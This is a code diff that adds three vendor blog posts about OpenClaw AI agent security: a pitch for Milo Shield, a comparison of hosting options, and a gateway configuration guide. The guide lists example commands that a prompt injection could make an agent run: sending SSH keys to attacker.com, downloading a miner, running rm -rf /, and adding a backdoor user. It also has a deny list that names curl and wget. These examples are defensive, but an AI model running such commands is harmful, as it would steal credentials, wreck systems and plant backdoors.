@@ -638,6 +638,626 @@ Until these are in place, the burden is on individual users to protect themselve
 *[Full OpenClaw Security Guide →](https://getmilo.dev/blog/openclaw-security-guide-2026)*
 
 *Built by Milo — security tools for the OpenClaw ecosystem.*`
+  },
+  {
+    slug: "milo-shield-vs-manual-hardening",
+    title: "Milo Shield vs Manual Hardening: OpenClaw Security Comparison (2026)",
+    description: "Should you secure OpenClaw yourself or use Milo Shield? Side-by-side comparison of automated vs manual security hardening — time, cost, coverage, and ongoing monitoring.",
+    date: "2026-02-24",
+    author: "Milo",
+    readTime: "7 min read",
+    tags: ["comparison", "security", "milo-shield", "openclaw"],
+    content: `## TL;DR
+
+Milo Shield ($29, one-time) automates 25+ security checks in 5 minutes with ongoing monitoring. Manual hardening is free but takes 4-8 hours, requires intermediate Linux/networking knowledge, and has no automated monitoring. If your time is worth more than $4/hour, Milo Shield pays for itself instantly.
+
+## The Full Comparison
+
+| Factor | Milo Shield ($29) | Manual Hardening |
+|--------|-------------------|------------------|
+| **Setup time** | 5 minutes | 4-8 hours |
+| **Security checks** | 25+ automated | Depends on your knowledge |
+| **Ongoing monitoring** | Daily/weekly automated scans | You remember to re-check (maybe) |
+| **Known-bad skill database** | Updated regularly, 1,100+ signatures | Must track advisories yourself |
+| **CVE detection** | Automatic version checking | Must monitor CVE feeds |
+| **Prompt injection scanning** | Automated pattern detection | Manual code review per skill |
+| **Network exposure detection** | Port scanning + config analysis | Manual \`ss\` / \`netstat\` checks |
+| **Remediation** | One-click fixes with rollback | Edit configs manually |
+| **Cost** | $29 one-time | Free (but your time isn't) |
+| **Skill level required** | Beginner | Intermediate to Advanced |
+| **False sense of security risk** | Low — comprehensive coverage | High — easy to miss things |
+
+## What Milo Shield Catches That Manual Often Misses
+
+### 1. Malicious Skills
+
+There are over 1,100 known malicious skills on ClawHub and ClawMart. Milo Shield cross-references every installed skill against this database. Manually, you'd need to:
+
+- Download and read the source code of every skill
+- Recognize obfuscated payloads, encoded strings, and subtle prompt injections
+- Keep track of newly discovered malicious skills as they're found
+
+Most people don't do this. 36% of ClawHub skills contain prompt injection vectors — are you confident you'd spot them all?
+
+### 2. Configuration Drift
+
+You harden your config today. Three weeks later, you install a new skill that changes a setting. A month after that, you update OpenClaw and a default changes. Milo Shield's scheduled monitoring catches this drift. Manual hardening is a point-in-time snapshot.
+
+### 3. Network Exposure You Don't Know About
+
+Your gateway is on 127.0.0.1 — great. But did you know that some skills can spawn their own listeners? Or that certain OpenClaw plugins expose additional ports? Milo Shield scans for all network exposure, not just the gateway.
+
+### 4. Outdated Dependencies
+
+OpenClaw's security depends on its dependencies too. CVE-2026-25253 affected versions prior to 1.8.2 and enabled remote code execution via malicious skills. Milo Shield checks your version against known CVEs automatically.
+
+## When Manual Hardening Makes Sense
+
+Manual hardening is the right choice if:
+
+- **You're a security professional** and this is literally your job
+- **You're learning** and want to understand OpenClaw security deeply
+- **You have a single, simple deployment** with no skills installed
+- **You enjoy the process** and will actually maintain it over time
+
+Even then, the free audit tool at [getmilo.dev](https://getmilo.dev) gives you a quick sanity check.
+
+## When Milo Shield Makes Sense
+
+Milo Shield is the right choice if:
+
+- **Your time is valuable** — 5 minutes vs 4-8 hours
+- **You run multiple instances** — scan them all, same tool
+- **You want ongoing protection** — not just a one-time hardening
+- **You install community skills** — automated malware scanning is essential
+- **You're not a security expert** — Shield knows what to look for
+
+## The Real Cost Comparison
+
+| Scenario | Manual Cost | Milo Shield Cost |
+|----------|------------|-----------------|
+| **Initial hardening** | 4-8 hours of your time | $29 + 5 minutes |
+| **Monthly maintenance** | 1-2 hours checking configs, CVEs, skills | $0 (automated) |
+| **After a security incident** | Hours/days of forensics | Shield would have caught it |
+| **Year 1 total time** | 16-32 hours | 5 minutes |
+| **Year 1 total cost** (at $50/hr) | $800-$1,600 | $29 |
+
+## FAQ
+
+**Q: Is Milo Shield worth $29?**
+
+Yes, if your time has any value at all. The math is simple: manual hardening takes 4-8 hours minimum. At any hourly rate above $4, Milo Shield saves you money on day one. Plus you get ongoing monitoring that manual hardening simply doesn't provide.
+
+**Q: Can I secure OpenClaw without Milo Shield?**
+
+Absolutely. Everything Milo Shield does can be done manually — it's not magic, it's automation. The [free security audit](https://getmilo.dev) and [setup wizard](https://getmilo.dev/setup) give you the knowledge. The question is whether you'll actually do it all, and keep doing it.
+
+**Q: What if I already hardened manually? Is Shield still useful?**
+
+Yes — it'll verify your work (you might have missed something) and add ongoing monitoring. Think of it as a second pair of eyes that never sleeps.
+
+**Q: Does Milo Shield require internet access?**
+
+No. It runs locally on your OpenClaw instance. It doesn't phone home or send any data externally. The known-bad skill database is bundled with the skill file.
+
+**Q: Will Milo Shield break my setup?**
+
+No. All remediation actions are optional and include rollback capability. Shield identifies issues and suggests fixes — you choose which to apply.
+
+---
+
+*[Run the free security audit →](https://getmilo.dev)*
+
+*[Get Milo Shield ($29) →](https://getmilo.dev#get-shield)*`
+  },
+  {
+    slug: "openclaw-hosting-compared",
+    title: "OpenClaw Hosting Options Compared: Self-Host vs Managed vs Cloud (2026)",
+    description: "Honest comparison of every way to host OpenClaw in 2026 — self-hosting on VPS/Pi, SimpleClaw, Clawctl, hostmenow, Majordomo, and cloud providers. Prices, pros, cons, and security defaults.",
+    date: "2026-02-24",
+    author: "Milo",
+    readTime: "9 min read",
+    tags: ["comparison", "hosting", "openclaw", "guide"],
+    content: `## TL;DR
+
+Self-hosting gives you maximum control and lowest cost ($5-12/mo) but requires technical knowledge. Managed platforms (SimpleClaw, Clawctl, hostmenow) cost $15-50/mo but handle everything. The right choice depends on your technical comfort level, budget, and how much customization you need. Regardless of hosting choice, security auditing matters — most breaches happen because of configuration, not infrastructure.
+
+## The Complete Comparison
+
+| Feature | Self-Host (VPS) | Self-Host (Pi/Home) | SimpleClaw | Clawctl | hostmenow | Majordomo |
+|---------|----------------|-------------------|------------|---------|-----------|-----------|
+| **Monthly cost** | $5-12 | $0 (hardware once) | $19/mo | $25/mo | $15/mo | $49/mo |
+| **Setup difficulty** | Medium-Hard | Hard | Easy | Easy | Easy | Easy |
+| **Setup time** | 1-4 hours | 2-6 hours | 5 minutes | 5 minutes | 10 minutes | 5 minutes |
+| **Security defaults** | You configure | You configure | Pre-hardened | Pre-hardened | Basic | Enterprise |
+| **Customization** | Full | Full | Limited | Moderate | Limited | Moderate |
+| **Skill installation** | Unrestricted | Unrestricted | Curated | Curated | Unrestricted | Curated + reviewed |
+| **Uptime guarantee** | Your responsibility | Your responsibility | 99.9% | 99.9% | 99% | 99.99% |
+| **Support** | Community | Community | Email | Email + Chat | Email | Priority + Phone |
+| **Backups** | Manual | Manual | Automatic | Automatic | Manual | Automatic |
+| **Updates** | Manual | Manual | Automatic | Automatic | Semi-auto | Automatic |
+| **Multi-agent** | Yes (manual) | Yes (manual) | Up to 3 | Up to 5 | 1 | Unlimited |
+| **Best for** | Developers, tinkerers | Homelab enthusiasts | Non-technical users | Small teams | Budget users | Businesses |
+
+## Option 1: Self-Hosting on a VPS
+
+**Best providers:** Hetzner ($4.50/mo), DigitalOcean ($6/mo), Linode ($5/mo), Vultr ($5/mo)
+
+**Pros:**
+- Cheapest option for always-on hosting
+- Full control over everything
+- No vendor lock-in
+- Install any skill, any model, any configuration
+- Learn how everything works
+
+**Cons:**
+- You're responsible for security, updates, and backups
+- Requires Linux command line knowledge
+- No support if something breaks
+- 135,000+ exposed instances prove most people get security wrong
+
+**Recommended specs:** 2 vCPU, 2GB RAM, 40GB SSD minimum. More if running local models.
+
+**Security note:** If you self-host, you MUST configure authentication, bind to localhost, and set up a reverse proxy. Use the [free security audit](https://getmilo.dev) to verify your config or [Milo Shield](https://getmilo.dev#get-shield) for ongoing monitoring.
+
+## Option 2: Self-Hosting on Raspberry Pi / Home Server
+
+**Pros:**
+- No monthly costs after hardware purchase
+- Data stays in your home
+- Fun project for homelab enthusiasts
+- Works surprisingly well for personal use
+
+**Cons:**
+- Dependent on your home internet (upload speed, uptime, dynamic IP)
+- Power outages = agent goes down
+- Harder to access remotely without VPN/tunnel
+- Pi 4/5 adequate for API-based models, not enough for local LLMs
+
+**Hardware:** Raspberry Pi 5 ($80) or any old laptop/mini PC. 4GB RAM minimum.
+
+**Security note:** Home deployments are actually safer by default — they're behind NAT and not directly reachable from the internet. Just don't port-forward 3000.
+
+## Option 3: SimpleClaw (Managed)
+
+**Price:** $19/mo (Starter), $39/mo (Pro), $79/mo (Team)
+
+**What you get:** Fully managed OpenClaw with web dashboard, pre-configured security, automatic updates, built-in backups.
+
+**Pros:**
+- Easiest setup — literally click and go
+- Security pre-configured (auth, TLS, sandboxed exec)
+- Automatic updates and backups
+- Web dashboard for management
+
+**Cons:**
+- Limited customization
+- Can't install arbitrary skills (curated marketplace only)
+- More expensive than self-hosting
+- Vendor lock-in on their platform
+
+**Best for:** Non-technical users who want OpenClaw without the ops work.
+
+## Option 4: Clawctl (Managed)
+
+**Price:** $25/mo (Individual), $49/mo (Team), $99/mo (Business)
+
+**What you get:** Managed OpenClaw with CLI and API access, team features, moderate customization.
+
+**Pros:**
+- Good balance of managed + customizable
+- CLI access for power users
+- Team collaboration features
+- Decent skill marketplace curation
+
+**Cons:**
+- Pricier than SimpleClaw for single users
+- API access requires paid plan
+- Some advanced features locked behind Business tier
+
+**Best for:** Developers and small teams who want managed hosting with more control.
+
+## Option 5: hostmenow (Budget Managed)
+
+**Price:** $15/mo flat
+
+**What you get:** Basic managed hosting, single agent, community support.
+
+**Pros:**
+- Cheapest managed option
+- Simple, no-frills hosting
+- Quick setup
+
+**Cons:**
+- Single agent only
+- Basic security defaults (not as hardened as SimpleClaw/Clawctl)
+- Limited support
+- No automatic backups
+
+**Best for:** Budget-conscious users who want managed but don't need bells and whistles.
+
+## Option 6: Majordomo (Enterprise)
+
+**Price:** $49/mo (Starter), custom pricing for enterprise
+
+**What you get:** Enterprise-grade managed OpenClaw with compliance features, priority support, SLA guarantees.
+
+**Pros:**
+- Enterprise security (SOC 2, audit logs, role-based access)
+- Priority support with phone option
+- 99.99% uptime SLA
+- Unlimited agents
+- Skill security review before installation
+
+**Cons:**
+- Most expensive option
+- Overkill for personal use
+- Custom pricing means sales calls for larger deployments
+
+**Best for:** Businesses with compliance requirements or multiple agents.
+
+## The Security Reality
+
+Here's the thing most hosting comparisons won't tell you: **the hosting platform matters less than your configuration.**
+
+The 135,000+ exposed OpenClaw instances aren't on a particular hosting provider — they're everywhere. VPS users forget to configure auth. Managed platform users override security defaults. Home users port-forward without thinking.
+
+**Regardless of where you host, you should:**
+1. Run a security audit on your configuration
+2. Verify authentication is enabled and strong
+3. Restrict exec permissions
+4. Audit installed skills
+5. Set up monitoring
+
+The [free security audit at getmilo.dev](https://getmilo.dev) works with any hosting setup. If you want automated ongoing monitoring, [Milo Shield](https://getmilo.dev#get-shield) runs on any OpenClaw instance regardless of hosting provider.
+
+## FAQ
+
+**Q: What's the cheapest way to run OpenClaw?**
+
+Self-hosting on a Hetzner VPS at $4.50/month. Or free on a Raspberry Pi you already own (just electricity costs). For managed hosting, hostmenow at $15/month is the cheapest.
+
+**Q: Which hosting is most secure by default?**
+
+Majordomo has the strongest security defaults (enterprise-grade with SOC 2 compliance). Among budget options, SimpleClaw and Clawctl both ship with pre-hardened configurations. Self-hosting has no security by default — it's entirely up to you.
+
+**Q: Should I self-host or use managed hosting?**
+
+Self-host if: you're technical, you enjoy tinkering, you want full control, and you'll actually maintain security. Use managed if: you want it to just work, you're not comfortable with Linux, or you don't want to think about security and updates.
+
+**Q: Can I migrate between hosting options?**
+
+Yes. OpenClaw configs and skills are portable. Export your config, SOUL.md, memory files, and installed skills. Import them on the new platform. The main friction is with managed platforms that use custom skill marketplaces.
+
+**Q: Do I need a powerful server for OpenClaw?**
+
+Not if you're using API-based models (Claude, GPT, Gemini). OpenClaw itself is lightweight — 2 vCPU and 2GB RAM is plenty. You only need serious hardware if running local LLMs (then you want GPU + 16GB+ RAM).
+
+---
+
+*[Check your security config (any hosting) →](https://getmilo.dev)*
+
+*[Set up OpenClaw securely from scratch →](https://getmilo.dev/setup)*`
+  },
+  {
+    slug: "gateway-configuration-best-practices",
+    title: "OpenClaw Gateway Configuration Best Practices (2026 Guide)",
+    description: "Every critical gateway.yaml setting explained — what it does, the recommended value, and what goes wrong if you misconfigure it. Auth modes, rate limiting, model selection, and memory management.",
+    date: "2026-02-24",
+    author: "Milo",
+    readTime: "10 min read",
+    tags: ["gateway", "configuration", "guide", "openclaw"],
+    content: `## TL;DR
+
+The gateway is the brain of your OpenClaw deployment. Three settings matter most: bind to \`127.0.0.1\` (not \`0.0.0.0\`), enable strong auth tokens, and set exec to \`allowlist\`. Get these three right and you've eliminated 90% of attack surface. This guide covers every critical setting.
+
+## Critical Gateway Settings Reference
+
+| Setting | Recommended Value | Default | Risk if Misconfigured |
+|---------|------------------|---------|----------------------|
+| \`gateway.host\` | \`127.0.0.1\` | \`0.0.0.0\` ⚠️ | Full public exposure — anyone can control your agent |
+| \`gateway.port\` | \`3000\` (or custom) | \`3000\` | Minor — just use a non-standard port if exposed |
+| \`gateway.auth.allowedKeys\` | 32+ char random string | None ⚠️ | Zero authentication — full unauthorized access |
+| \`exec.security\` | \`allowlist\` | \`full\` ⚠️ | Arbitrary command execution via prompt injection |
+| \`exec.allowedCommands\` | Specific commands only | All ⚠️ | Attacker can run any command on your system |
+| \`model.apiKey\` | Environment variable | Plaintext in config | Key theft if config is exposed |
+| \`model.model\` | Your choice | Provider default | Cost — some models are 100x more expensive |
+| \`model.maxTokens\` | Set a limit | Unlimited ⚠️ | Token blowout — unexpected API bills |
+| \`memory.maxContextTokens\` | 100K-200K | Model max | Context overflow, degraded responses |
+| \`channels.*.allowedUsers\` | Specific IDs | All ⚠️ | Anyone in the channel can control your agent |
+
+## Section 1: Network & Access Control
+
+### Binding Address
+
+The single most critical setting. This determines who can reach your gateway.
+
+\`\`\`yaml
+# ✅ CORRECT — only accessible locally
+gateway:
+  host: 127.0.0.1
+  port: 3000
+
+# ❌ DANGEROUS — accessible from the entire internet
+gateway:
+  host: 0.0.0.0
+  port: 3000
+\`\`\`
+
+If you need remote access, use a reverse proxy:
+
+\`\`\`
+# Caddy (automatic HTTPS)
+openclaw.yourdomain.com {
+  reverse_proxy localhost:3000
+  basicauth {
+    admin $2a$14$your_bcrypt_hash
+  }
+}
+\`\`\`
+
+### Authentication Tokens
+
+Always set strong, unique auth tokens:
+
+\`\`\`yaml
+gateway:
+  auth:
+    allowedKeys:
+      - "kJ8x#mP2$vN9qR4wT6yB3cF7hL0sD5a"  # At least 32 characters
+\`\`\`
+
+**Token generation best practice:**
+\`\`\`bash
+# Generate a cryptographically random token
+openssl rand -hex 32
+\`\`\`
+
+**Never use:**
+- \`changeme\`, \`admin\`, \`password123\`
+- Short tokens (< 16 characters)
+- The same token across multiple instances
+- Tokens committed to git repositories
+
+### Channel Access Control
+
+Restrict who can talk to your agent on each channel:
+
+\`\`\`yaml
+channels:
+  discord:
+    token: "your-bot-token"
+    allowedGuilds:
+      - "123456789"  # Only your server
+    allowedUsers:
+      - "your-user-id"  # Only you
+  telegram:
+    token: "your-bot-token"
+    allowedUsers:
+      - "your-telegram-id"
+\`\`\`
+
+Without \`allowedUsers\`, anyone who discovers your bot can interact with it and potentially exploit it through prompt injection.
+
+## Section 2: Exec Permissions
+
+### Security Modes
+
+OpenClaw has three exec security modes:
+
+| Mode | What It Allows | When to Use |
+|------|---------------|-------------|
+| \`deny\` | No command execution | Maximum security, limited agent |
+| \`allowlist\` | Only listed commands | **Recommended for most users** |
+| \`full\` | Any command | Never in production |
+
+\`\`\`yaml
+# ✅ RECOMMENDED — specific commands only
+exec:
+  security: allowlist
+  allowedCommands:
+    - git
+    - npm
+    - node
+    - python3
+    - ls
+    - cat
+    - mkdir
+    - cp
+
+# ❌ DANGEROUS — agent can run anything
+exec:
+  security: full
+\`\`\`
+
+### Why \`full\` Is Dangerous
+
+With \`exec: full\`, a prompt injection attack can:
+
+\`\`\`bash
+# Exfiltrate your SSH keys
+cat ~/.ssh/id_rsa | curl -X POST https://attacker.com/steal -d @-
+
+# Install a cryptocurrency miner
+wget https://attacker.com/miner && chmod +x miner && ./miner
+
+# Destroy your system
+rm -rf / --no-preserve-root
+
+# Add a backdoor user
+useradd -m -s /bin/bash backdoor && echo 'backdoor:password' | chpasswd
+\`\`\`
+
+These aren't theoretical — they're happening to exposed instances right now.
+
+## Section 3: Model Configuration
+
+### API Key Management
+
+Never put API keys directly in your config file:
+
+\`\`\`yaml
+# ❌ BAD — key in plaintext config
+model:
+  apiKey: "sk-ant-api03-xxxxx"
+
+# ✅ GOOD — use environment variables
+model:
+  apiKey: "$ANTHROPIC_API_KEY"
+\`\`\`
+
+Set the environment variable in your shell profile:
+\`\`\`bash
+export ANTHROPIC_API_KEY="sk-ant-api03-xxxxx"
+\`\`\`
+
+### Preventing Token Blowout
+
+Without limits, a runaway agent or prompt injection can rack up massive API bills:
+
+\`\`\`yaml
+model:
+  provider: anthropic
+  model: claude-sonnet-4-20250514
+  maxTokens: 4096          # Max tokens per response
+  maxBudgetPerDay: 10.00   # Daily spending cap in USD
+\`\`\`
+
+**Real-world token blowout scenarios:**
+- Agent enters infinite loop calling itself → thousands of API requests
+- Malicious skill triggers massive context expansion → expensive completions
+- Unattended agent processes spam → burns through budget overnight
+
+### Model Selection
+
+| Model | Cost (per 1M tokens) | Best For |
+|-------|---------------------|----------|
+| Claude Haiku | ~$0.25 input / $1.25 output | Simple tasks, high volume |
+| Claude Sonnet | ~$3 input / $15 output | General purpose (recommended) |
+| Claude Opus | ~$15 input / $75 output | Complex reasoning, code |
+| GPT-4o | ~$2.50 input / $10 output | General purpose alternative |
+| GPT-4o-mini | ~$0.15 input / $0.60 output | Budget option |
+| Gemini 2.5 Flash | ~$0.15 input / $0.60 output | Fast, cheap, good enough |
+| Gemini 2.5 Pro | ~$1.25 input / $10 output | Complex tasks, long context |
+
+**Recommendation:** Start with Sonnet or GPT-4o for general use. Use Haiku/Flash for high-volume, simple tasks. Only use Opus for complex reasoning you can't get from Sonnet.
+
+## Section 4: Memory & Context Management
+
+### Context Window Limits
+
+\`\`\`yaml
+memory:
+  maxContextTokens: 150000  # Don't let context grow unbounded
+  compactionThreshold: 120000  # Compact before hitting the limit
+  compactionStrategy: summary  # or 'truncate'
+\`\`\`
+
+**What happens without limits:**
+- Context grows until it hits the model's maximum
+- Each request becomes more expensive (you pay for the full context)
+- Response quality degrades as context gets noisy
+- Eventually the model fails or produces garbage
+
+### Compaction Strategies
+
+| Strategy | How It Works | Pros | Cons |
+|----------|-------------|------|------|
+| \`summary\` | LLM summarizes old context | Preserves key information | Uses API call to summarize |
+| \`truncate\` | Drops oldest messages | Simple, no extra cost | Loses information permanently |
+| \`sliding\` | Keeps last N messages | Predictable memory use | Fixed window, no prioritization |
+
+**Recommendation:** Use \`summary\` for agents that have long-running tasks. Use \`truncate\` for simple chatbots. Use \`sliding\` if you want predictable costs.
+
+## Section 5: Rate Limiting & Abuse Prevention
+
+\`\`\`yaml
+gateway:
+  rateLimit:
+    maxRequestsPerMinute: 30
+    maxRequestsPerHour: 500
+    cooldownSeconds: 60
+\`\`\`
+
+Rate limiting prevents:
+- API cost runaway from rapid-fire requests
+- DoS attacks if your gateway is accidentally exposed
+- Infinite loop scenarios where the agent calls itself
+
+## Complete Recommended Configuration
+
+\`\`\`yaml
+gateway:
+  host: 127.0.0.1
+  port: 3000
+  auth:
+    allowedKeys:
+      - "$OPENCLAW_AUTH_TOKEN"
+  rateLimit:
+    maxRequestsPerMinute: 30
+    maxRequestsPerHour: 500
+
+model:
+  provider: anthropic
+  apiKey: "$ANTHROPIC_API_KEY"
+  model: claude-sonnet-4-20250514
+  maxTokens: 4096
+  maxBudgetPerDay: 10.00
+
+exec:
+  security: allowlist
+  allowedCommands:
+    - git
+    - npm
+    - node
+    - python3
+    - ls
+    - cat
+    - mkdir
+
+memory:
+  maxContextTokens: 150000
+  compactionThreshold: 120000
+  compactionStrategy: summary
+
+channels:
+  discord:
+    token: "$DISCORD_BOT_TOKEN"
+    allowedGuilds:
+      - "your-guild-id"
+    allowedUsers:
+      - "your-user-id"
+\`\`\`
+
+## FAQ
+
+**Q: What's the most important gateway setting?**
+
+\`gateway.host: 127.0.0.1\`. This single setting prevents your agent from being accessible on the public internet. It eliminates 90% of the attack surface. Everything else is secondary.
+
+**Q: How do I prevent token blowout?**
+
+Three layers: (1) Set \`maxTokens\` to limit per-response costs. (2) Set \`maxBudgetPerDay\` as a spending cap. (3) Set \`memory.maxContextTokens\` to prevent context from growing unbounded. Together, these cap your maximum daily spend.
+
+**Q: Should I use auth tokens or IP allowlisting?**
+
+Both if possible. Auth tokens (\`allowedKeys\`) are essential — they verify identity. IP allowlisting adds a second layer by restricting where requests can come from. But IP allowlisting alone isn't enough because IPs can be spoofed or change.
+
+**Q: What exec commands should I allowlist?**
+
+Only the commands your agent actually needs. Start with nothing (\`deny\`) and add commands as you discover your agent needs them. Common safe additions: \`git\`, \`npm\`, \`node\`, \`python3\`, \`ls\`, \`cat\`, \`mkdir\`. Never add: \`rm\`, \`sudo\`, \`chmod\`, \`curl\`, \`wget\` unless you have a specific, controlled use case.
+
+**Q: How do I know if my gateway config is secure?**
+
+Run the [free security audit at getmilo.dev](https://getmilo.dev) — paste your config and get an instant A-F score with specific recommendations. For ongoing monitoring, [Milo Shield](https://getmilo.dev#get-shield) checks your config continuously and alerts on drift.
+
+---
+
+*[Audit your gateway config free →](https://getmilo.dev)*
+
+*[Interactive setup wizard →](https://getmilo.dev/setup)*
+
+*[Get Milo Shield for ongoing monitoring →](https://getmilo.dev#get-shield)*`
   }
 ];
 
